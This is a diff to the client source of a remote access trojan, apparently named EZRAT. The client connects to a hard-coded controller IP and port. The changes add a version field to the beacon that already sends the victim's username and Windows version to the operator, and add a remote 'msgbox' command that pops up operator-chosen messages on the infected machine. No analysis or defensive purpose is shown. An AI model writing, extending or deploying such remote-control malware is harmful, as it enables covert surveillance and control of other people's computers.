@@ -13,6 +13,7 @@ using EZRATClient.Utils;
 using EZRATClient.Forms;
 using System.Diagnostics;
 using System.Drawing.Imaging;
+using System.Windows.Forms;
 
 namespace EZRATClient
 {
@@ -33,6 +34,7 @@ namespace EZRATClient
 
         static string _ip = "192.168.1.112";
         static int _port = 1234;
+        static string _version = "0.1.0.1";
 
         public static string Ip { get => _ip; set => _ip = value; }
         public static int Port { get => _port; set => _port = value; }
@@ -206,6 +208,8 @@ namespace EZRATClient
                 response += SystemInfo.GetUserName();
                 response += "¦";
                 response += SystemInfo.GetWindowsVersion();
+                response += "¦";
+                response += _version;
 
                 SendCommand(response);
 
@@ -377,6 +381,31 @@ namespace EZRATClient
                 result += "¦";
                 result += SystemInfoDetails.GetTotalRamAmount();
                 SendCommand(result);
+            }
+            else if (text.StartsWith("msgbox;"))
+            {
+                string options = text.Substring(7);
+                string[] tmp = options.Split(';');
+                string title = tmp[0];
+                string value = tmp[1];
+                int icon = Convert.ToInt32(tmp[2]);
+                MessageBoxIcon i;
+                switch (icon)
+                {
+                    case 0:
+                        i = MessageBoxIcon.Information;
+                        break;
+                    case 1:
+                        i = MessageBoxIcon.Error;
+                        break;
+                    case 2:
+                        i = MessageBoxIcon.Question;
+                        break;
+                    default:
+                        i = MessageBoxIcon.Information;
+                        break;
+                }
+                MessageBox.Show(value,title,MessageBoxButtons.OK,i);
             }
         }
 
